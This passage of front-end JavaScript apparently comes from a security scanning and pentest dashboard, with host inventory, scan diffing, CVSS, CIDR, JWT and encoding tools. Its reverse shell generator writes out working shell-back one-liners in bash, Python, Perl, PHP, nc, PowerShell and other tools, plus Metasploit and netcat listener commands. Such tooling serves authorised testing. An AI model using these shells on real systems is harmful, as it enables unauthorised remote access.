    if (el?.value) loadAttackPaths(el.value);
  }
  if (page === 'probes')       loadProbes();
  if (page === 'findings')     loadFindings();
  if (page === 'reports')      loadReports();
  if (page === 'schedules')    loadSchedules();
  if (page === 'intelligence') {
    populateAIScanFilter(STATE.scans);
    const el = document.getElementById('aiScanFilter');
    if (el && !el.value) {
      const done = STATE.scans.find(s => s.status === 'completed');
      if (done) el.value = done.id;
    }
  }
  if (page === 'settings') {
    document.getElementById('settingsBrainUrl').value = STATE.brainUrl;
    document.getElementById('settingsApiKey').value   = STATE.apiKey;
    setText('settingsBrainUrlDisplay', STATE.brainUrl);
  }
  if (page === 'hosts') {
    populateScanFilter(STATE.scans);
    loadHosts(document.getElementById('hostScanFilter')?.value || '');
  }
  if (page === 'diff')          populateDiffScanSelects(STATE.scans);
  if (page === 'tools')         { updateCVSSDisplay(); genRevShell(); }
  if (page === 'deploy-probe')  refreshDeployProbePage();
  if (page === 'threats')       loadThreatActors();
  if (page === 'crownjewels')   renderJewelGrid();
  if (page === 'compliance')    populateComplianceScanSelect();
  if (page === 'integrations')  { loadIntegrations(); populateExportScanSelect(); }
  if (page === 'phishing')      loadPhishingCampaigns();
  if (page === 'threatintel')   { tiLoadIOCs(); populateTIScanSelect(); }
  if (page === 'security-score')  loadSecurityScore();
  if (page === 'breach-monitor')  loadBreachMonitor();
  if (page === 'link-analyzer')   loadAnalyzerHistory();
  if (page === 'footprint')       loadFootprintScans();
  if (page === 'home-guardian')   initHomeGuardian();
  if (page === 'domain-guardian') loadDomainGuardian();
  if (page === 'password-tools')  initPasswordTools();
  if (page === 'subdomains')      initSubdomainPage();
  if (page === 'osint-emails')    initOsintEmailPage();
  if (page === 'secrets-scanner') initSecretsScannerPage();
  if (page === 'notifications')   loadNotificationsPage();
  if (page === 'topology') {
    populateScanFilter(STATE.scans);
    const el = document.getElementById('topoScanFilter');
    if (el && !el.value && STATE.scans.length) el.value = STATE.scans[0]?.id || '';
    setTimeout(() => loadTopologyMap(el?.value || ''), 100);
  }

  injectGuideBtn(page);
  updateAssistantContext(page);
}

// ── Host Inventory ────────────────────────────────────────────

async function loadHosts(scanId) {
  try {
    const params = new URLSearchParams();
    if (scanId) params.set('scan_id', scanId);
    const hosts = await api(`/api/v1/findings/host-risk?${params}`);
    const nb = document.getElementById('navHostCount');
    if (nb) { nb.textContent = hosts.length; nb.style.display = hosts.length ? '' : 'none'; }
    const el = document.getElementById('hostsCount');
    if (el) el.textContent = hosts.length;
    STATE._allHosts = hosts;
    renderHostsGrid(hosts);
  } catch(e) { console.warn('Hosts load error:', e); }
}

function renderHostsGrid(hosts) {
  const grid = document.getElementById('hostsGrid');
  if (!grid) return;
  const search = (document.getElementById('hostSearch')?.value || '').toLowerCase();
  const filtered = search ? hosts.filter(h => h.host.includes(search)) : hosts;
  if (!filtered.length) {
    grid.innerHTML = '<div class="empty" style="padding:64px;text-align:center;grid-column:1/-1">No hosts found</div>';
    return;
  }
  grid.innerHTML = filtered.map(h => {
    const rc = h.risk_score >= 8 ? 'var(--critical)' : h.risk_score >= 6 ? 'var(--high,#f0853a)' : h.risk_score >= 4 ? 'var(--warning)' : 'var(--success)';
    const C = 2 * Math.PI * 22;
    const dash = ((h.risk_score / 10) * C).toFixed(1);
    const gap  = (C - parseFloat(dash)).toFixed(1);
    return `<div class="host-card" onclick="drilldownHost('${esc(h.host)}')">
      <div class="host-card-header">
        <div>
          <div class="host-ip">${esc(h.host)}</div>
          <div style="font-size:12px;color:var(--text-3);margin-top:2px">${h.finding_count} finding${h.finding_count !== 1 ? 's' : ''}</div>
        </div>
        <svg width="56" height="56" viewBox="0 0 56 56" style="flex-shrink:0">
          <circle cx="28" cy="28" r="22" fill="none" stroke="rgba(255,255,255,0.06)" stroke-width="4"/>
          <circle cx="28" cy="28" r="22" fill="none" stroke="${rc}" stroke-width="4"
            stroke-dasharray="${dash} ${gap}" stroke-linecap="round" transform="rotate(-90 28 28)"/>
          <text x="28" y="33" text-anchor="middle" fill="${rc}" font-size="12" font-weight="700" font-family="Inter,sans-serif">${h.risk_score.toFixed(1)}</text>
        </svg>
      </div>
      <div class="host-card-body">
        <div class="host-card-row"><span class="host-card-label">Max Severity</span><span class="sev sev-${h.max_severity}">${esc(h.max_severity_label)}</span></div>
        ${h.open_ports?.length ? `<div class="host-card-row"><span class="host-card-label">Ports</span><span class="host-ports">${h.open_ports.slice(0,7).join(', ')}${h.open_ports.length > 7 ? ' +' + (h.open_ports.length - 7) + ' more' : ''}</span></div>` : ''}
        ${h.cves?.length ? `<div class="host-card-row"><span class="host-card-label">CVEs</span><span style="font-size:12px;color:var(--warning)">${h.cves.length} — ${h.cves.slice(0,2).join(', ')}${h.cves.length > 2 ? '…' : ''}</span></div>` : ''}
        ${h.attack_techniques?.length ? `<div class="host-card-row"><span class="host-card-label">ATT&CK</span><span style="font-size:11px;color:var(--text-3)">${h.attack_techniques.slice(0,4).join(', ')}</span></div>` : ''}
      </div>
      <div class="host-card-actions">
        <button class="btn btn-ghost btn-sm" onclick="event.stopPropagation();drilldownHost('${esc(h.host)}')">View Findings</button>
      </div>
    </div>`;
  }).join('');
}

function drilldownHost(host) {
  const hf = document.getElementById('hostFilter');
  if (hf) hf.value = host;
  navigateTo('findings');
  loadFindings(undefined, undefined, host);
}

// ── Scan Diff ─────────────────────────────────────────────────

function populateDiffScanSelects(scans) {
  const completed = scans.filter(s => s.status === 'completed');
  const opts = '<option value="">Select scan…</option>' + completed.map(s =>
    `<option value="${s.id}">${esc(s.name)} (${fmtDate(s.started_at)})</option>`
  ).join('');
  const elA = document.getElementById('diffScanA');
  const elB = document.getElementById('diffScanB');
  if (elA) elA.innerHTML = opts;
  if (elB) elB.innerHTML = opts;
  if (completed.length >= 2) {
    if (elA) elA.value = completed[completed.length - 2]?.id || '';
    if (elB) elB.value = completed[completed.length - 1]?.id || '';
  }
}

async function runScanDiff() {
  const scanA = document.getElementById('diffScanA')?.value;  // baseline
  const scanB = document.getElementById('diffScanB')?.value;  // target
  if (!scanA || !scanB) return showError('Select both scans to compare.');
  if (scanA === scanB) return showError('Select two different scans.');
  const btn = document.getElementById('runDiffBtn');
  if (btn) { btn.disabled = true; btn.textContent = 'Comparing…'; }
  try {
    // Use the server-side diff endpoint for accurate comparison
    const diff = await api(`/api/v1/scans/${scanB}/diff?baseline=${scanA}`);
    const delta = diff.risk_delta ?? 0;
    const deltaStr = delta > 0 ? `+${delta.toFixed(1)}` : delta.toFixed(1);
    setText('diffNewCount',   diff.summary.new_count);
    setText('diffFixedCount', diff.summary.fixed_count);
    setText('diffSameCount',  diff.summary.persistent_count);
    setText('diffDelta', deltaStr);
    const de = document.getElementById('diffDelta');
    if (de) de.style.color = delta > 0 ? 'var(--critical)' : delta < 0 ? 'var(--success)' : 'var(--text-2)';
    document.getElementById('diffSummary').style.display = '';
    document.getElementById('diffResults').style.display = '';
    window._diffData = { new: diff.new, fixed: diff.fixed, same: diff.persistent };
    renderDiffTab('new');
    document.querySelectorAll('.diff-tab').forEach(t => t.classList.toggle('active', t.dataset.tab === 'new'));

    // Show compliance impact if any new critical/high findings
    const newCritHigh = (diff.new || []).filter(f => f.severity >= 3);
    if (newCritHigh.length > 0) {
      addEvent('warning', `Diff: ${newCritHigh.length} new Critical/High finding${newCritHigh.length>1?'s':''} detected`);
    }
    if ((diff.summary.fixed_count || 0) > 0) {
      addEvent('task', `Diff: ${diff.summary.fixed_count} finding${diff.summary.fixed_count>1?'s':''} remediated since baseline`);
    }
  } catch(e) { showError(`Diff failed: ${e.message}`); }
  finally { if (btn) { btn.disabled = false; btn.textContent = 'Compare Scans'; } }
}

function renderDiffTab(tab) {
  const data = window._diffData;
  if (!data) return;
  const findings = data[tab] || [];
  const container = document.getElementById('diffTabContent');
  if (!container) return;
  const tc = { new: 'diff-tag-new', fixed: 'diff-tag-fixed', same: 'diff-tag-same' }[tab];
  const tl = { new: 'NEW', fixed: 'FIXED', same: '=' }[tab];
  if (!findings.length) {
    container.innerHTML = `<div class="empty" style="padding:32px">No ${tab} findings in this comparison.</div>`;
    return;
  }
  const sorted = [...findings].sort((a, b) => b.severity - a.severity);
  container.innerHTML = sorted.map(f => {
    const rs = f.remediation_status || 'new';
    const rsBadge = tab !== 'fixed' ? `<span class="rstat-badge ${(RSTAT_LABELS[rs]||RSTAT_LABELS.new).cls}">${(RSTAT_LABELS[rs]||RSTAT_LABELS.new).label}</span>` : '';
    return `
    <div class="diff-finding-row">
      <span class="diff-tag ${tc}">${tl}</span>
      <span class="sev sev-${f.severity}">${sevLabel(f.severity)}</span>
      <code style="font-size:12px;color:var(--text-2);flex-shrink:0">${esc(f.host)}${f.port ? ':' + f.port : ''}</code>
      <span style="flex:1">${esc(f.title)}</span>
      ${rsBadge}
      ${f.cve_id ? `<code style="font-size:11px;color:var(--warning);flex-shrink:0">${esc(f.cve_id)}</code>` : ''}
    </div>`;
  }).join('');
}

// ── Pentest Tools ─────────────────────────────────────────────

// CVSS v3.1 Calculator
const CVSS_STATE = { AV:'N', AC:'L', PR:'N', UI:'N', S:'U', C:'H', I:'H', A:'H' };
const CVSS_W = {
  AV: { N:0.85, A:0.62, L:0.55, P:0.2 },
  AC: { L:0.77, H:0.44 },
  PR_U: { N:0.85, L:0.62, H:0.27 },
  PR_C: { N:0.85, L:0.50, H:0.50 },
  UI: { N:0.85, R:0.62 },
  CIA: { H:0.56, L:0.22, N:0.0 },
};

function calcCVSSScore() {
  const { AV, AC, PR, UI, S, C, I, A } = CVSS_STATE;
  const prW = S === 'U' ? CVSS_W.PR_U[PR] : CVSS_W.PR_C[PR];
  const ISS  = 1 - (1 - CVSS_W.CIA[C]) * (1 - CVSS_W.CIA[I]) * (1 - CVSS_W.CIA[A]);
  const expl = 8.22 * CVSS_W.AV[AV] * CVSS_W.AC[AC] * prW * CVSS_W.UI[UI];
  let impact = S === 'U' ? 6.42 * ISS : 7.52 * (ISS - 0.029) - 3.25 * Math.pow(ISS - 0.02, 15);
  if (impact <= 0) return 0;
  const raw = S === 'U' ? Math.min(impact + expl, 10) : Math.min(1.08 * (impact + expl), 10);
  return Math.round(Math.ceil(raw * 10) / 10 * 10) / 10;
}

function cvssVector() {
  const { AV, AC, PR, UI, S, C, I, A } = CVSS_STATE;
  return `CVSS:3.1/AV:${AV}/AC:${AC}/PR:${PR}/UI:${UI}/S:${S}/C:${C}/I:${I}/A:${A}`;
}

function updateCVSSDisplay() {
  const score = calcCVSSScore();
  const [severity, color] = score === 0 ? ['None', 'var(--text-3)'] :
    score < 4 ? ['Low', '#4fc9f0'] :
    score < 7 ? ['Medium', 'var(--warning)'] :
    score < 9 ? ['High', '#f0853a'] :
               ['Critical', 'var(--critical)'];
  const se = document.getElementById('cvssScoreDisplay');
  const ve = document.getElementById('cvssSeverityLabel');
  const vv = document.getElementById('cvssVector');
  if (se) { se.textContent = score.toFixed(1); se.style.color = color; }
  if (ve) { ve.textContent = severity; ve.style.color = color; }
  if (vv) vv.textContent = cvssVector();
}

// Encoder / Decoder
async function doEncode(type) {
  const input = document.getElementById('encoderInput')?.value ?? '';
  let result = '';
  try {
    if (type === 'b64')    result = btoa(unescape(encodeURIComponent(input)));
    else if (type === 'url')   result = encodeURIComponent(input);
    else if (type === 'html') { const d = document.createElement('div'); d.appendChild(document.createTextNode(input)); result = d.innerHTML; }
    else if (type === 'hex')  result = Array.from(new TextEncoder().encode(input)).map(b=>b.toString(16).padStart(2,'0')).join('');
    else if (type === 'sha256') {
      const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(input));
      result = Array.from(new Uint8Array(buf)).map(b=>b.toString(16).padStart(2,'0')).join('');
    }
    else if (type === 'md5') {
      // Simple MD5 implementation (RFC 1321)
      result = md5(input);
    }
  } catch(e) { result = `Error: ${e.message}`; }
  const out = document.getElementById('encoderOutput');
  if (out) out.value = result;
}

function doDecode(type) {
  const input = document.getElementById('encoderInput')?.value ?? '';
  let result = '';
  try {
    if (type === 'b64')   result = decodeURIComponent(escape(atob(input.trim())));
    else if (type === 'url')  result = decodeURIComponent(input);
    else if (type === 'html') { const el = document.createElement('div'); el.innerHTML = input; result = el.textContent; }
    else if (type === 'hex')  result = new TextDecoder().decode(new Uint8Array((input.match(/.{1,2}/g)||[]).map(h=>parseInt(h,16))));
  } catch(e) { result = `Error: ${e.message}`; }
  const out = document.getElementById('encoderOutput');
  if (out) out.value = result;
}

// Simple MD5 (for the encoder tool)
function md5(str) {
  function safeAdd(x,y){const lsw=(x&0xFFFF)+(y&0xFFFF);const msw=(x>>16)+(y>>16)+(lsw>>16);return(msw<<16)|(lsw&0xFFFF);}
  function bitRotateLeft(num,cnt){return(num<<cnt)|(num>>>(32-cnt));}
  function md5cmn(q,a,b,x,s,t){return safeAdd(bitRotateLeft(safeAdd(safeAdd(a,q),safeAdd(x,t)),s),b);}
  function md5ff(a,b,c,d,x,s,t){return md5cmn((b&c)|((~b)&d),a,b,x,s,t);}
  function md5gg(a,b,c,d,x,s,t){return md5cmn((b&d)|(c&(~d)),a,b,x,s,t);}
  function md5hh(a,b,c,d,x,s,t){return md5cmn(b^c^d,a,b,x,s,t);}
  function md5ii(a,b,c,d,x,s,t){return md5cmn(c^(b|(~d)),a,b,x,s,t);}
  const bytes = new TextEncoder().encode(str);
  const length8 = bytes.length;
  const extra = ((length8 + 8) >>> 6) + 1;
  const paddedLength = extra * 16;
  const padded = new Int32Array(paddedLength);
  for (let i=0;i<length8;i++) { padded[i>>2] |= bytes[i] << ((i%4)*8); }
  padded[length8>>2] |= 0x80 << ((length8%4)*8);
  padded[paddedLength-2] = length8*8;
  let a=1732584193,b=-271733879,c=-1732584194,d=271733878;
  for (let i=0;i<paddedLength;i+=16) {
    const [oa,ob,oc,od]=[a,b,c,d];
    a=md5ff(a,b,c,d,padded[i],7,-680876936);d=md5ff(d,a,b,c,padded[i+1],12,-389564586);c=md5ff(c,d,a,b,padded[i+2],17,606105819);b=md5ff(b,c,d,a,padded[i+3],22,-1044525330);
    a=md5ff(a,b,c,d,padded[i+4],7,-176418897);d=md5ff(d,a,b,c,padded[i+5],12,1200080426);c=md5ff(c,d,a,b,padded[i+6],17,-1473231341);b=md5ff(b,c,d,a,padded[i+7],22,-45705983);
    a=md5ff(a,b,c,d,padded[i+8],7,1770035416);d=md5ff(d,a,b,c,padded[i+9],12,-1958414417);c=md5ff(c,d,a,b,padded[i+10],17,-42063);b=md5ff(b,c,d,a,padded[i+11],22,-1990404162);
    a=md5ff(a,b,c,d,padded[i+12],7,1804603682);d=md5ff(d,a,b,c,padded[i+13],12,-40341101);c=md5ff(c,d,a,b,padded[i+14],17,-1502002290);b=md5ff(b,c,d,a,padded[i+15],22,1236535329);
    a=md5gg(a,b,c,d,padded[i+1],5,-165796510);d=md5gg(d,a,b,c,padded[i+6],9,-1069501632);c=md5gg(c,d,a,b,padded[i+11],14,643717713);b=md5gg(b,c,d,a,padded[i],20,-373897302);
    a=md5gg(a,b,c,d,padded[i+5],5,-701558691);d=md5gg(d,a,b,c,padded[i+10],9,38016083);c=md5gg(c,d,a,b,padded[i+15],14,-660478335);b=md5gg(b,c,d,a,padded[i+4],20,-405537848);
    a=md5gg(a,b,c,d,padded[i+9],5,568446438);d=md5gg(d,a,b,c,padded[i+14],9,-1019803690);c=md5gg(c,d,a,b,padded[i+3],14,-187363961);b=md5gg(b,c,d,a,padded[i+8],20,1163531501);
    a=md5gg(a,b,c,d,padded[i+13],5,-1444681467);d=md5gg(d,a,b,c,padded[i+2],9,-51403784);c=md5gg(c,d,a,b,padded[i+7],14,1735328473);b=md5gg(b,c,d,a,padded[i+12],20,-1926607734);
    a=md5hh(a,b,c,d,padded[i+5],4,-378558);d=md5hh(d,a,b,c,padded[i+8],11,-2022574463);c=md5hh(c,d,a,b,padded[i+11],16,1839030562);b=md5hh(b,c,d,a,padded[i+14],23,-35309556);
    a=md5hh(a,b,c,d,padded[i+1],4,-1530992060);d=md5hh(d,a,b,c,padded[i+4],11,1272893353);c=md5hh(c,d,a,b,padded[i+7],16,-155497632);b=md5hh(b,c,d,a,padded[i+10],23,-1094730640);
    a=md5hh(a,b,c,d,padded[i+13],4,681279174);d=md5hh(d,a,b,c,padded[i],11,-358537222);c=md5hh(c,d,a,b,padded[i+3],16,-722521979);b=md5hh(b,c,d,a,padded[i+6],23,76029189);
    a=md5hh(a,b,c,d,padded[i+9],4,-640364487);d=md5hh(d,a,b,c,padded[i+12],11,-421815835);c=md5hh(c,d,a,b,padded[i+15],16,530742520);b=md5hh(b,c,d,a,padded[i+2],23,-995338651);
    a=md5ii(a,b,c,d,padded[i],6,-198630844);d=md5ii(d,a,b,c,padded[i+7],10,1126891415);c=md5ii(c,d,a,b,padded[i+14],15,-1416354905);b=md5ii(b,c,d,a,padded[i+5],21,-57434055);
    a=md5ii(a,b,c,d,padded[i+12],6,1700485571);d=md5ii(d,a,b,c,padded[i+3],10,-1894986606);c=md5ii(c,d,a,b,padded[i+10],15,-1051523);b=md5ii(b,c,d,a,padded[i+1],21,-2054922799);
    a=md5ii(a,b,c,d,padded[i+8],6,1873313359);d=md5ii(d,a,b,c,padded[i+15],10,-30611744);c=md5ii(c,d,a,b,padded[i+6],15,-1560198380);b=md5ii(b,c,d,a,padded[i+13],21,1309151649);
    a=md5ii(a,b,c,d,padded[i+4],6,-145523070);d=md5ii(d,a,b,c,padded[i+11],10,-1120210379);c=md5ii(c,d,a,b,padded[i+2],15,718787259);b=md5ii(b,c,d,a,padded[i+9],21,-343485551);
    a=safeAdd(a,oa);b=safeAdd(b,ob);c=safeAdd(c,oc);d=safeAdd(d,od);
  }
  const toHex = v => { let s=''; for(let i=0;i<4;i++) s+=((v>>>(i*8))&0xFF).toString(16).padStart(2,'0'); return s; };
  return toHex(a)+toHex(b)+toHex(c)+toHex(d);
}

// Reverse Shell Generator
function genRevShell() {
  const ip   = document.getElementById('rsIP')?.value.trim()   || '10.10.10.10';
  const port = document.getElementById('rsPort')?.value.trim() || '4444';
  const type = document.getElementById('rsType')?.value        || 'bash';
  const shells = {
    bash:       `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
    bash_udp:   `bash -i >& /dev/udp/${ip}/${port} 0>&1`,
    python3:    `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
    python2:    `python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
    perl:       `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'`,
    ruby:       `ruby -rsocket -e 'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
    php:        `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
    nc:         `nc -e /bin/sh ${ip} ${port}`,
    nc_openbsd: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`,
    socat:      `socat TCP:${ip}:${port} EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane`,
    powershell: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client=New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sb,0,$sb.Length);$stream.Flush()};$client.Close()"`,
    awk:        `awk 'BEGIN{s="/inet/tcp/0/${ip}/${port}";while(1){do{printf "shell>" |& s;s |& getline c;if(c){while((c |& getline)>0)print|&s;close(c)}}while(c!="exit");close(s)}}'`,
  };
  const cmd = shells[type] || shells.bash;
  const out = document.getElementById('revshellOutput');
  if (out) out.textContent = cmd;
  setText('listenerNC',    `nc -lvnp ${port}`);
  setText('listenerSocat', `socat TCP-LISTEN:${port},reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane`);
  setText('listenerMSF',   `use multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT ${port}; run`);
  setText('listenerPwncat',`pwncat-cs -lp ${port}`);
}

// CIDR Calculator
function calcCIDR() {
  const input = document.getElementById('cidrInput')?.value.trim();
  const result = document.getElementById('cidrResult');
  if (!result) return;
  if (!input) { result.innerHTML = '<div class="empty">Enter a CIDR (e.g. 192.168.1.0/24)</div>'; return; }
  try {
    const [ipStr, prefStr] = input.includes('/') ? input.split('/') : [input, '32'];
    const prefix = parseInt(prefStr);
    if (isNaN(prefix) || prefix < 0 || prefix > 32) throw new Error('Prefix must be 0–32');
    const parts = ipStr.split('.').map(Number);
    if (parts.length !== 4 || parts.some(p => isNaN(p) || p < 0 || p > 255)) throw new Error('Invalid IP');
    const ipNum  = ((parts[0]*256 + parts[1])*256 + parts[2])*256 + parts[3];
    const mask   = prefix === 0 ? 0 : (0xFFFFFFFF << (32 - prefix)) >>> 0;
    const net    = (ipNum & mask) >>> 0;
    const bcast  = (net | (~mask >>> 0)) >>> 0;
    const first  = prefix < 31 ? net + 1 : net;
    const last   = prefix < 31 ? bcast - 1 : bcast;
    const hosts  = prefix >= 32 ? 1 : prefix === 31 ? 2 : Math.pow(2, 32 - prefix) - 2;
    const n2ip   = n => [(n>>>24)&255,(n>>>16)&255,(n>>>8)&255,n&255].join('.');
    const isPriv = parts[0]===10 || (parts[0]===172&&parts[1]>=16&&parts[1]<=31) || (parts[0]===192&&parts[1]===168);
    const cls    = parts[0]<128?'A':parts[0]<192?'B':parts[0]<224?'C':'D/E';
    const items  = [
      { label: 'Network Address',    value: n2ip(net) },
      { label: 'Broadcast',          value: n2ip(bcast) },
      { label: 'First Usable Host',  value: n2ip(first) },
      { label: 'Last Usable Host',   value: n2ip(last) },
      { label: 'Subnet Mask',        value: n2ip(mask) },
      { label: 'Wildcard Mask',      value: n2ip(~mask >>> 0) },
      { label: 'Usable Hosts',       value: hosts.toLocaleString() },
      { label: 'Total Addresses',    value: Math.pow(2, 32 - prefix).toLocaleString() },
      { label: 'IP Class',           value: cls },
      { label: 'Private Range',      value: isPriv ? '✓ RFC 1918' : '✗ Public' },
    ];
    result.innerHTML = items.map(i => `<div class="cidr-item"><div class="cidr-item-label">${i.label}</div><div class="cidr-item-value">${i.value}</div></div>`).join('');
  } catch(e) {
    result.innerHTML = `<div class="empty">Error: ${esc(e.message)}</div>`;
  }
}

function setCIDR(val) { const el = document.getElementById('cidrInput'); if (el) { el.value = val; calcCIDR(); } }

// JWT Decoder
function decodeJWT() {
  const input = document.getElementById('jwtInput')?.value.trim();
  const result = document.getElementById('jwtResult');
  if (!result) return;
  if (!input) { result.innerHTML = ''; return; }
  const parts = input.split('.');
  if (parts.length < 2) { result.innerHTML = '<div class="empty">Invalid JWT — expected header.payload[.signature]</div>'; return; }
  const b64d = s => {
    try {
      const p = s.replace(/-/g,'+').replace(/_/g,'/') + '==='.slice(0, (4 - s.length % 4) % 4);
      return JSON.parse(decodeURIComponent(escape(atob(p))));
    } catch { return atob(s.replace(/-/g,'+').replace(/_/g,'/')); }
  };
  const header  = b64d(parts[0]);
  const payload = b64d(parts[1]);
  const sig     = parts[2] || '(none)';
  const now = Math.floor(Date.now() / 1000);
  const timeNotes = typeof payload === 'object' ? [
    payload.exp ? `\n// exp → ${new Date(payload.exp*1000).toISOString()} ${payload.exp<now?'⚠ EXPIRED':'✓ valid'}` : '',
    payload.iat ? `\n// iat → ${new Date(payload.iat*1000).toISOString()}` : '',
    payload.nbf ? `\n// nbf → ${new Date(payload.nbf*1000).toISOString()}` : '',
  ].join('') : '';
  result.innerHTML = `
    <div class="jwt-part">
      <div class="jwt-part-label jwt-header-label">HEADER · Algorithm &amp; Token Type</div>
      <pre class="code-block" style="margin:0">${esc(JSON.stringify(header,null,2))}</pre>
    </div>
    <div class="jwt-part">
      <div class="jwt-part-label jwt-payload-label">PAYLOAD · Claims</div>
      <pre class="code-block" style="margin:0">${esc(JSON.stringify(payload,null,2))}${esc(timeNotes)}</pre>
    </div>
    <div class="jwt-part">
      <div class="jwt-part-label jwt-sig-label">SIGNATURE · Unverified</div>
      <div class="code-block" style="word-break:break-all;font-size:11px;margin:0">${esc(sig)}</div>
    </div>`;
}

// Analyst Notes
async function saveFindingNote(findingId) {
  const note = document.getElementById('findingNoteInput')?.value || '';
  try {
    await api(`/api/v1/findings/${findingId}/note`, { method: 'PATCH', body: JSON.stringify({ note }) });
    const msg = document.getElementById('notesSavedMsg');
    if (msg) { msg.style.opacity = '1'; setTimeout(() => { msg.style.opacity = '0'; }, 2000); }
    const idx = STATE.findings.findIndex(f => f.id === findingId);
    if (idx >= 0) STATE.findings[idx].analyst_note = note;
  } catch(e) { showError(`Failed to save note: ${e.message}`); }
}

// Compliance Mapping
function getComplianceTags(f) {
  // Prefer server-side compliance_controls if available
  if (f.compliance_controls && f.compliance_controls.length > 0) {
    return f.compliance_controls.map(c => ({ std: c.standard, ref: c.control_ref, name: c.control_name }));
  }
  // Fallback: client-side inference
  const text = ((f.title||'') + ' ' + (f.service||'') + ' ' + (f.description||'')).toLowerCase();
  const tags = new Map();
  const add = (std, ref, name) => { const k = std+ref; if (!tags.has(k)) tags.set(k, {std, ref, name}); };
  // OWASP 2021
  if (/sql.inject|command.inject|xxe|ssti|ldap/.test(text))        add('OWASP','A03:2021','Injection');
  if (/broken.auth|session.fixat|weak.password|default.cred/.test(text)) add('OWASP','A07:2021','Auth Failures');
  if (/xss|cross.site.script/.test(text))                           add('OWASP','A03:2021','XSS (Injection)');
  if (/ssl|tls|cert|hsts|cipher|encrypt/.test(text))               add('OWASP','A02:2021','Crypto Failures');
  if (/cve-|unpatched|outdated|vulnerable component/.test(text))   add('OWASP','A06:2021','Vulnerable Components');
  if (/idor|broken.access|privilege.escalat|misconfig/.test(text)) add('OWASP','A01:2021','Broken Access Control');
  if (/ssrf/.test(text))                                            add('OWASP','A10:2021','SSRF');
  if (/deseri|rce|remote.code|log4/.test(text))                    add('OWASP','A08:2021','Integrity Failures');
  // PCI-DSS v4
  if (/ssl|tls|weak.cipher/.test(text))           add('PCI-DSS','6.2.4','Secure Comms');
  if (/default.cred|default.password/.test(text)) add('PCI-DSS','2.2.1','Default Credentials');
  if (/port|exposed|open.service/.test(text))     add('PCI-DSS','1.3.1','Network Access');
  if (/cve-|patch|exploit/.test(text))            add('PCI-DSS','6.3.3','Patch Management');
  if (/snmp|telnet|ftp/.test(text))               add('PCI-DSS','2.2.7','Insecure Protocols');
  if (/rdp|remote.desktop/.test(text))            add('PCI-DSS','12.3.2','Remote Access Security');
  // NIST 800-53
  if (/auth|cred|password|kerberos/.test(text))  add('NIST','IA-5','Authenticator Mgmt');
  if (/ssl|tls|encrypt/.test(text))              add('NIST','SC-8','Transmission Security');
  if (/cve-|patch|vulner/.test(text))            add('NIST','SI-2','Flaw Remediation');
  if (/access|exposure|public/.test(text))       add('NIST','AC-3','Access Enforcement');
  if (/smb|rdp|ssh|remote/.test(text))           add('NIST','AC-17','Remote Access');
  if (/admin.panel|exposed.admin/.test(text))    add('NIST','CM-7','Least Functionality');
  if (/dns.zone|zone.transfer/.test(text))       add('NIST','SC-20','Secure Name Resolution');
  // CIS Controls v8
  if (/port|service|open/.test(text))            add('CIS','4.4','Manage Network Ports');
  if (/ssl|tls|cert|hsts/.test(text))            add('CIS','3.10','Encrypt Sensitive Data');
  if (/cve-|patch|outdated/.test(text))          add('CIS','7.3','Automated Patch Mgmt');
  if (/default.cred|weak.password/.test(text))   add('CIS','5.2','Use Unique Passwords');
  if (/snmp.community|public.community/.test(text)) add('CIS','12.2','Manage Network Devices');
  return [...tags.values()].slice(0, 8);
}

// Copy helpers
async function copyElementText(elementId) {
  const el = document.getElementById(elementId);
  if (!el) return;
  const text = el.tagName === 'TEXTAREA' || el.tagName === 'INPUT' ? el.value : el.textContent;
  try {
    await navigator.clipboard.writeText(text);
    addEvent('task', 'Copied to clipboard');
  } catch {
    const t = document.createElement('textarea');
    t.value = text; document.body.appendChild(t); t.select(); document.execCommand('copy'); document.body.removeChild(t);
    addEvent('task', 'Copied to clipboard');
  }
}

// ── Modal ─────────────────────────────────────────────────────

function openModal(id) {
  document.getElementById('modalOverlay').classList.add('open');
  document.querySelectorAll('.modal').forEach(m => m.style.display='none');
  const m = document.getElementById(id);
  if (m) m.style.display = 'flex';
}

function closeModal() {
  document.getElementById('modalOverlay').classList.remove('open');
}

// ── Live Scan Monitor ─────────────────────────────────────────

const LIVE = {
  scanId: null, name: '', started: null,
  phase: -1, done: false,
  hosts: 0, ports: 0, services: 0, crit: 0, high: 0, total: 0,
  _timer: null,
};

const PHASES = [
  { key: 'HOST_DISCOVERY',    label: 'Host\nDiscovery',    icon: '⬡' },
  { key: 'PORT_SCAN',         label: 'Port\nScan',         icon: '⬡' },
  { key: 'SERVICE_DETECTION', label: 'Service\nDetect',    icon: '⬡' },
  { key: 'VULN_SCAN',         label: 'Vuln\nScan',         icon: '⬡' },
  { key: 'ATTACK_PATH',       label: 'Attack\nPaths',      icon: '⬡' },
